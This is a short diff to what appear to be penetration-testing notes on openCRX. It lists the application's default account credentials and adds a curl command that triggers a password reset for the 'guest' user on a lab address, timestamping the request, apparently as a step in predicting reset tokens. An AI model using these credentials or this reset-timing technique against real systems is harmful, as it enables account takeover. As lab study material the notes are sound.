@@ -25,3 +25,8 @@ guest : guest
 admin-Standard : admin-Standard
 admin-Root : admin-Root
 ```
+
+```
+date +%s%3N && curl -s -i -X 'POST' --data-binary 'id=guest' 'http://192.168.100.2:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && date +%s%3N
+
+```
